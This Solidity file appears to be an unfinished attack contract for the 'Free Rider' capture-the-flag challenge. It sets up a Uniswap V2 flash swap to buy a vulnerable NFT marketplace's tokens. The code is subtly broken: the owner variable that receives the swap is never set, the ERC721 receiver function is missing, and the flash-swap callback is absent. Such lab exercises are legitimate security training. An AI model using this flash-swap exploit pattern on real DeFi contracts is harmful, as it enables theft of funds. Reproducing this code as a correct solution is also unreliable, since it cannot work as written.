pragma solidity = 0.8.25;

import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from '../../src/free-rider/FreeRiderRecoveryManager.sol';
import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import {WETH} from "lib/solmate/src/tokens/WETH.sol";
import {IUniswapV2Pair} from "lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract AttackFreeRider is IERC721Receiver {
    WETH weth;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    DamnValuableNFT nft;
    IUniswapV2Pair uniswapPair;
    address owner;
    constructor (
        WETH _weth,
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecoveryManager _recoveryManager,
        DamnValuableNFT _nft
    ) payable {
        weth = _weth;
        marketplace = _marketplace;
        recoveryManager = _recoveryManager;
        nft = _nft;
        uniswapPair = _uniswapPair;
    }

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;

    function attack() public payable {
        bytes memory data = abi.encode(NFT_PRICE);
        uniswapPair.swap(15 ether, 0, address(owner), data);
    }
}